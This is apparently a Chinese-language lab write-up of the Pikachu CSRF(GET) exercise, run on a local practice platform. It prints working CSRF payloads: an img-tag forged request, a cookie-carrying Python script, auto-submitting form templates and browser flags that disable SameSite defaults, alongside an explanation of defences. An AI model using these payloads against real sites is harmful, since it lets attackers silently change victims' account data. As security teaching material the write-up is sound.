---
layout: post
title: Pikachu - CSRF(GET) Writeup（含 SameSite 防护实测）
platform: pikachu
date: 2026-10-25 20:49:00 +0800
categories: CTF
---

Pikachu - CSRF(GET) Writeup（含 SameSite 防护实测）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：CSRF → CSRF(get)
- 入口：`http://localhost/pikachu/vul/csrf/csrfget/csrf_get_login.php`
- 题型：Web
- 考点：**跨站请求伪造（CSRF）**、GET 型提交、**SameSite 浏览器防护**

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**测试账号**（登录页"点一下提示"里写着）：

```text
vince / 123456
allen / 123456
kobe  / 123456
grady / 123456
kevin / 123456
lucy  / 123456
lili  / 123456

★ 7 个账号，密码全是 123456
```

**✅ 实测结果**

```text
★ 服务端逻辑验证（用带 cookie 的脚本模拟）：

    登录 vince → 资料：boy / 18626545453 / chain / vince@pikachu.com
    访问攻击 URL（带 cookie）
    → 资料变成：黑客 / 110 / 被CSRF改了 / hacker@evil.com      ✅ 攻击成立

★ 浏览器实测（攻击页放在 file:// 上）：

    打开 my.html → 浏览器出现"裂图"（请求发出了）
    → 但会员中心刷新后，资料【没有变化】                    ❌ 攻击失败

★ 原因定位：

    服务器 Set-Cookie: PHPSESSID=xxx; path=/
                      ↑ 没有 SameSite 属性
    → 现代 Chrome/Edge 默认当作 SameSite=Lax
    → Lax 规则：跨站请求【不携带 cookie】
    → file:// 到 http://localhost 是跨站 → cookie 被拦
    → 服务器认为"没登录" → 302 跳转登录页 → 数据没改
```

二、题目分析

**① 三个页面构成一个完整业务**

```text
csrf_get_login.php   →  登录页（GET 表单）
        ↓ 登录成功
csrf_get.php         →  会员中心（显示资料）
        ↓ 点"修改个人信息"
csrf_get_edit.php    →  修改资料页（GET 表单）★ 有漏洞
```

**② 登录页（GET 提交，本身就不安全）**

```php
// csrf_get_login.php 第 31 行
if(isset($_GET['submit'])){
    if($_GET['username']!=null && $_GET['password']!=null){
        $username = escape($link, $_GET['username']);
        $password = escape($link, $_GET['password']);
        $query = "select * from member where username='$username' and pw=md5('$password')";
        // 登录成功 → 写入 session
        $_SESSION['csrf']['username'] = $username;
```

```html
<form method="get">
    <input name="username">
    <input name="password">
    <input name="submit" value="submit">
</form>
```

**★ 用 GET 登录意味着**：

```text
账号密码会出现在 URL 里
→ 被浏览器历史记录、服务器日志、代理记录
→ 这本身是个信息泄露问题（另一个话题）

★ 对我们的好处：可以直接用 URL 登录
    http://localhost/pikachu/vul/csrf/csrfget/csrf_get_login.php
        ?username=vince&password=123456&submit=submit
```

**③ 修改资料页（漏洞所在）**

```php
// csrf_get_edit.php 第 24-42 行
if(!check_csrf_login($link)){                    // ① 只检查"有没有登录"
    header("location:csrf_get_login.php");
}

if(isset($_GET['submit'])){
    if($_GET['sex'] && $_GET['phonenum'] && $_GET['add'] && $_GET['email']){
        $getdata = escape($link, $_GET);

        // ② 直接用 GET 参数拼 UPDATE
        $query = "update member set
                    sex='{$getdata['sex']}',
                    phonenum='{$getdata['phonenum']}',
                    address='{$getdata['add']}',
                    email='{$getdata['email']}'
                  where username='{$_SESSION['csrf']['username']}'";

        $result = execute($link, $query);
        if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){
            header("location:csrf_get.php");     // 改成功就跳转
        }
    }
}
```

```html
<!-- csrf_get_edit.php 第 79-86 行 -->
<form method="get">
    <p>性别:<input type="text" name="sex"      value="{$sex}"/></p>
    <p>手机:<input type="text" name="phonenum" value="{$phonenum}"/></p>
    <p>住址:<input type="text" name="add"      value="{$add}"/></p>
    <p>邮箱:<input type="text" name="email"    value="{$email}"/></p>
    <input type="submit" name="submit" value="submit"/>
</form>
```

**★ 三个致命缺失**：

```text
① 用 GET 提交
   → 参数全在 URL 里
   → 可以做成"一张图片"或"一个链接"

② 没有 CSRF token
   → 服务器无法确认"这个请求是不是本人主动发的"

③ 没有 Referer / Origin 检查
   → 服务器无法确认"请求从哪个页面来的"

★ 只要受害者浏览器带着 cookie 请求那个 URL
  → 服务器就执行 UPDATE
  → 资料被改
```

**④ ⚠️ 一个容易搞错的细节：参数名 ≠ 字段名**

```text
表单参数名        数据库字段名
─────────────    ─────────────
sex          →   sex
phonenum     →   phonenum
add          →   address     ← ★ 不一样！
email        →   email
submit       →   （只是触发标记）
```

**★ 构造攻击 URL 时，要用【表单参数名】`add`，不是字段名 `address`。**

**★ 这是新手最容易错的地方 —— 写 `address=` 服务器收不到，整个请求不生效。**

三、解题步骤

**第 1 步：登录（可以用 URL 直接登）**

**方式 A：表单登录**

```text
① 打开 http://localhost/pikachu/vul/csrf/csrfget/csrf_get_login.php
② 用户名 vince，密码 123456，点 Login
```

**方式 B：直接访问带参数的 URL（推荐，避免输错）**

```text
http://localhost/pikachu/vul/csrf/csrfget/csrf_get_login.php?username=vince&password=123456&submit=submit
```

**★ 注意**：

```text
如果登录失败，先检查：
    · 是不是浏览器自动填充了旧密码（比如 admin/123456）
    · 密码后面是不是多了空格
    · 用户名大小写（MySQL 不敏感，vince / Vince 都行）
```

**第 2 步：看会员中心，记住当前资料**

```text
登录后会跳到 csrf_get.php：

    hello,vince,欢迎来到个人会员中心 | 退出登录
    
    姓名: vince
    性别: boy                    ← 记住
    手机: 18626545453            ← 记住
    住址: chain                  ← 记住
    邮箱: vince@pikachu.com      ← 记住
```

**第 3 步：观察"修改资料"页的表单（构造攻击的依据）**

```text
① 点"修改个人信息" → 进入 csrf_get_edit.php
② F12 → 【元素】→ 找到 <form>
③ 看到：

    <form method="get">
        <input name="sex">
        <input name="phonenum">
        <input name="add">       ← ★ 住址的参数名是 add
        <input name="email">
        <input name="submit" value="submit">
    </form>

④ 再看 F12 → 【网络】，随便提交一次，看请求 URL：

    csrf_get_edit.php?sex=boy&phonenum=18626545453&add=chain&email=...&submit=submit

★ 这就是攻击 URL 的模板
```

**第 4 步：写攻击页面（一行代码）**

**新建 `my.html`**，内容：

```html
<img src="http://localhost/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=hacked&phonenum=88888888&add=my_first_csrf&email=me@test.com&submit=submit">
```

**★ 就这么一行。不需要 `<html><head><body>`，浏览器能直接解析。**

**★ 参数说明**：

```text
sex       = hacked            会被写进数据库的 sex 字段
phonenum  = 88888888          手机
add       = my_first_csrf     住址（对应数据库 address 字段）
email     = me@test.com       邮箱
submit    = submit            触发标记（必须有）
```

**保存时的三个关键点**：

```text
① 文件名：my.html          （必须带 .html）
② 类型：  所有文件 (*.*)    （不能选"文本文档 *.txt"）
③ 编码：  UTF-8

★ 如果类型没改 → 会存成 my.html.txt → 双击打不开成网页
★ 正确的话，文件图标应该是浏览器图标
```

**第 5 步：测试攻击（会失败，但要看懂为什么）**

```text
① 确认 pikachu 会员中心还登录着（能打开，显示 hello,vince）
② 双击 my.html → 浏览器打开
③ 页面显示：一片空白 / 左上角一个"裂图"图标
④ 切回会员中心，按 F5
⑤ 看资料有没有变
```

**预期结果（现代浏览器）**：

```text
❌ 资料没变：还是 boy / 18626545453 / chain / vince@pikachu.com

★ 但"裂图"说明请求【发出去了】
★ 只是 cookie 没带上
```

**第 6 步：定位失败原因（这一课最有价值）**

**检查 1：服务器下发的 Cookie 有没有 SameSite**

**用命令行看响应头**：

```powershell
curl -I "http://localhost/pikachu/vul/csrf/csrfget/csrf_get_login.php"
```

**或者用 Python**：

```python
import urllib.request
with urllib.request.urlopen("http://localhost/pikachu/vul/csrf/csrfget/csrf_get_login.php") as r:
    for k, v in r.headers.items():
        if k.lower() == "set-cookie":
            print(v)
```

**输出**：

```text
PHPSESSID=uj454sijs5olt7k55v52f63dr9; path=/
                                      ↑ 没有 SameSite 属性
```

**★ 结论**：

```text
现代浏览器（Chrome 80+/Edge 80+）的规则：
    Cookie 没写 SameSite → 默认当作 SameSite=Lax

SameSite=Lax 的含义：
    跨站请求【不携带】cookie
    例外：顶层导航（点链接跳转、地址栏输入）会带

<img> 加载 = 子资源请求，不是顶层导航
→ 从 file:// 到 http://localhost，是跨站 → cookie 被拦
```

**检查 2：确认服务器必须要有 cookie**

```text
访问（不带 cookie）：
http://localhost/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=x&phonenum=1&add=y&email=z@z.com&submit=submit

→ 302 跳转到 csrf_get_login.php（登录页）
★ 说明服务器认不出你 → 不执行修改
```

**检查 3：用 F12 看请求有没有 Cookie**

```text
① 在 my.html 页面按 F12 → 【网络】→ F5
② 找 csrf_get_edit.php 那条请求
③ 点它 → 【请求标头】
④ 找有没有 Cookie: PHPSESSID=...

★ 没有 → 就是 SameSite 拦的（这是最常见的情况）
★ 有 + 302 → 那是别的原因（比如参数写错）
```

**第 7 步：两种方式让它真正打通**

**方式 A：同源部署（简单，验证"代码有漏洞"）**

**把攻击页放到 pikachu 目录下**，让它和目标是"同站"：

```powershell
# 复制到 pikachu 目录
copy C:\Users\cecilia\Desktop\my.html D:\phpstudy_pro\WWW\pikachu\my.html
```

**如果提示"拒绝访问"**，先授权（只需一次）：

```powershell
icacls "D:\phpstudy_pro\WWW" /grant cecilia:(O1)(CI)M
```

**然后访问**（★ 一定要用 http://，不能双击文件）：

```text
http://localhost/pikachu/my.html
```

**再刷新会员中心**：

```text
性别: hacked
手机: 88888888
住址: my_first_csrf
邮箱: me@test.com

★ 攻击成功
★ 原因：攻击页和目标是同站（同为 localhost）
        → SameSite 不限制同站请求
        → cookie 正常携带
```

**⚠️ 局限**：这不再是"真正的跨站"，只能证明"代码缺防护"。

**方式 B：关掉浏览器的 SameSite 防护（真跨站，模拟 2020 年前的浏览器）**

**用特殊参数启动浏览器**：

```powershell
# Edge
Start-Process "msedge.exe" -ArgumentList `
    "--disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure", `
    "--user-data-dir=C:\temp\edge-csrf-test"

# Chrome
Start-Process "chrome.exe" -ArgumentList `
    "--disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure", `
    "--user-data-dir=C:\temp\chrome-csrf-test"
```

**然后在这个"新浏览器窗口"里**：

```text
① 打开 http://localhost/pikachu/vul/csrf/csrfget/csrf_get_login.php
② 登录 vince / 123456
③ 双击桌面的 my.html（file:// 也可以）
④ 切回会员中心按 F5

→ 资料被改 ✅
```

**★ 这模拟了 2020 年之前的浏览器 —— 当时这类攻击真实可行。**

**第 8 步：验证服务端逻辑（不依赖浏览器的证据）**

**用脚本直接带 cookie 请求，证明"服务器确实会执行修改"**：

```python
import ssl, urllib.request, urllib.parse, http.cookiejar

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
BASE = "http://localhost/pikachu/vul/csrf/csrfget"

jar = http.cookiejar.LWPCookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(jar),
    urllib.request.HTTPSHandler(context=ctx))

def get(url):
    with opener.open(urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"}), timeout=15) as r:
        return r.read().decode('utf-8','replace')

# ① 登录
get(BASE + "/csrf_get_login.php?username=vince&password=123456&submit=submit")

# ② 带 cookie 访问攻击 URL
get(BASE + "/csrf_get_edit.php?" + urllib.parse.urlencode({
    "sex": "hacked", "phonenum": "88888888",
    "add": "my_first_csrf", "email": "me@test.com", "submit": "submit"}))

# ③ 看资料
html = get(BASE + "/csrf_get.php")
import re
for k, p in [("性别", r'性别:([^<]*)'), ("手机", r'手机:([^<]*)')]:
    m = re.search(p, html)
    print(k, "=", m.group(1).strip() if m else "?")
```

**输出**：

```text
性别 = hacked
手机 = 88888888

★ 证明：只要有 cookie，服务器就执行修改
★ 也就是说：漏洞在服务端是真实存在的
★ 浏览器（SameSite）只是"挡住了攻击者的第一个环节"
```

四、延伸知识

**① CSRF 的本质：借刀杀人**

```text
攻击者不需要：
    · 知道你的密码
    · 拿到你的 cookie

攻击者只需要：
    · 让你（已登录的用户）访问一个链接/页面
    · 你的浏览器自动带 cookie
    · 服务器以为是你在操作
```

**★ 三个必要条件（缺一不可）**：

```text
① 目标操作是"仅凭 cookie 就能完成"的
   （有 token 就不是了）

② 攻击者能预测/构造出那个请求
   （参数固定、无随机数）

③ 受害者的浏览器会自动发起请求
   （img / iframe / form / 链接）
```

**② 三种经典的利用方式**

**方式 1：`<img>`（最简单，只能 GET）**

```html
<img src="http://target/change?email=hacker@evil.com&submit=1" style="display:none">
```

**★ 优点**：一行代码，隐蔽（1px 不可见）
**★ 缺点**：只能发 GET

**方式 2：`<iframe>`（能藏页面，也只能 GET 或自动提交的表单）**

```html
<iframe src="http://target/change?..." style="display:none"></iframe>
```

**方式 3：自动提交的表单（能发 POST）**

```html
<form action="http://target/change" method="POST" id="f">
    <input name="email" value="hacker@evil.com">
    <input name="submit" value="1">
</form>
<script>document.getElementById('f').submit()</script>
```

**★ 这就是第 2 关（CSRF POST）要用的方式。**

**③ SameSite 详解（现代浏览器的 CSRF 防线）**

| 值 | 跨站请求带 cookie 吗 | 适用场景 |
|---|---|---|
| `Strict` | ❌ 完全不带 | 银行、支付等敏感操作 |
| **`Lax`**（默认） | ⚠️ **只带"顶层导航 GET"** | 大多数网站 |
| `None` | ✅ 总是带（必须配 `Secure` + HTTPS）| 第三方嵌入、跨站 SSO |

**Lax 的具体规则**：

```text
会带 cookie：
    · 点链接跳转（<a href>）
    · 地址栏输入
    · 302 跳转
    → 这些都是"顶层导航"

不会带 cookie：
    · <img> 加载
    · <iframe> 加载
    · <script> 加载
    · fetch / XHR（跨站）
    · 表单 POST
    → 这些都是"子资源请求 / 非顶层导航"
```

**★ 所以 `SameSite=Lax` 拦掉了绝大部分 CSRF，但拦不住**：

```text
· GET 型 CSRF 配合"点链接诱导"
  （如果受害者真的点了链接，Lax 会带 cookie）
· 老浏览器（不支持 SameSite）
· SameSite=None 的场景
```

**④ CSRF 的防护手段（从弱到强）**

| 手段 | 强度 | 说明 |
|---|---|---|
| 只有 session 认证 | ❌ | 就是本关的漏洞 |
| 检查 Referer | ⚠️ | 可被绕过（Referer 可空、可伪造于某些场景）|
| 检查 Origin | ⚠️ | 比 Referer 可靠，但老浏览器不支持 |
| **CSRF Token** | ✅✅ | **最经典有效**（见暴力破解第 4 关）|
| **SameSite=Strict** | ✅✅ | 现代主流方案，浏览器层拦截 |
| **二次确认**（输密码/验证码）| ✅✅✅ | 最安全，但影响体验 |
| **自定义请求头**（X-Requested-With）| ✅ | 跨站发不了自定义头（受 CORS 限制）|

**⑤ 为什么这个漏洞在 2020 年后"消失"了**

```text
2019 及以前：
    浏览器默认不限制跨站 cookie
    → CSRF 是最常见的 Web 漏洞之一
    → OWASP Top 10 常客

2020 年 2 月：
    Chrome 80 发布，默认 SameSite=Lax
    → 跨站子资源请求不带 cookie
    → 大量 CSRF 攻击失效

之后：
    Edge / Firefox / Safari 跟进
    → CSRF 攻击面大幅缩小

现在 CSRF 还存在的地方：
    · 老系统（还在支持旧浏览器）
    · 需要 SameSite=None 的业务（第三方嵌入、跨站支付回调）
    · GET 型 + 诱导点击（Lax 拦不住顶层导航）
    · 移动 App 的 WebView（策略不同）
```

**★ 这一课的意义**：

```text
"代码有漏洞" ≠ "漏洞可利用"

    服务端的代码（2019 年）确实缺防护
    但浏览器的进步（2020 年）替它补上了
    
★ 安全是"多层协作"的结果：
    代码 + 框架 + 服务器 + 浏览器 + 用户习惯
```

**⑥ 本地靶场的"时代错位"问题**

```text
pikachu 写于 2019 年
    → 当时这套代码是"真的可以被跨站打"

现在跑在 2026 年的浏览器上
    → 很多"当年的漏洞"已经被浏览器拦住了
    → 你会在靶场上"打不通"

★ 这不是靶场错了，是环境变了
★ 学习时要理解"为什么现在打不通"
   —— 这比"当年怎么打"更有价值
```

**类似的情况还有很多**：

```text
· XSS：CSP 的普及让很多 XSS 失效
· 点击劫持：X-Frame-Options 默认限制
· 混合内容：HTTPS 强制升级
· 明文传输：HSTS 强制 HTTPS
```

五、总结

- **本题核心：修改资料用 GET 提交 + 无 token + 无 Referer 检查 → 一个 `<img>` 就能改别人的资料。**

- **一个攻击页（一行代码）**：

```html
<img src="http://localhost/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=hacked&phonenum=88888888&add=my_first_csrf&email=me@test.com&submit=submit">
```

- **⚠️ 三个必知的关键点**：

```text
① 参数名是 add，不是 address
   （表单参数名 ≠ 数据库字段名）

② 现代浏览器会拦住（SameSite=Lax）
   file:// 或别的网站 → cookie 不带上 → 攻击失败
   ★ 这不是你写错了，是浏览器在保护你

③ 要真正打通，两条路：
   · 同源部署（放到 http://localhost/pikachu/ 下）
   · 关浏览器 SameSite（--disable-features 启动参数）
```

- **实测数据**：

```text
服务端逻辑（带 cookie 的脚本）：
    boy/18626545453/chain/vince@pikachu.com
    → 黑客/110/被CSRF改了/hacker@evil.com     ✅ 漏洞真实存在

浏览器实测（file:// 攻击页）：
    数据没变                                   ❌ SameSite 拦截
    服务器下发：PHPSESSID=xxx; path=/          （无 SameSite 属性）
```

- **这一课最大的收获**：

```text
┌────────────────────────────────────────────────────────┐
│  "代码有漏洞" ≠ "漏洞可利用"                             │
│                                                        │
│  服务端：缺 token、缺 Referer 检查 → 确实有洞            │
│  浏览器：SameSite=Lax → 把攻击的第一个环节掐断了          │
│                                                        │
│  ★ 安全是多层协作：代码 + 框架 + 服务器 + 浏览器          │
│  ★ 靶场"打不通"，恰恰是最好的教学素材                    │
└────────────────────────────────────────────────────────┘
```

- CSRF 模块进度：

```text
✅ CSRF(get)    —— 本题：GET 型 + SameSite 实测
⬜ CSRF(post)   —— POST 型，要用自动提交的表单
⬜ CSRF Token   —— 有 token 防护，看怎么突破（呼应暴力破解第 4 关）
```

**手工复现要点**：

```text
· 登录：vince / 123456（可以直接用 URL 带参数登录）
· 记住原始资料，方便对比
· 看修改资料页的表单参数名（sex/phonenum/add/email/submit）
· 写一行 <img src="..."> 保存为 my.html
· 打开它 → 刷新会员中心 → 看资料变没变
· 没变 → F12 看请求有没有 Cookie（大概率被 SameSite 拦了）
```
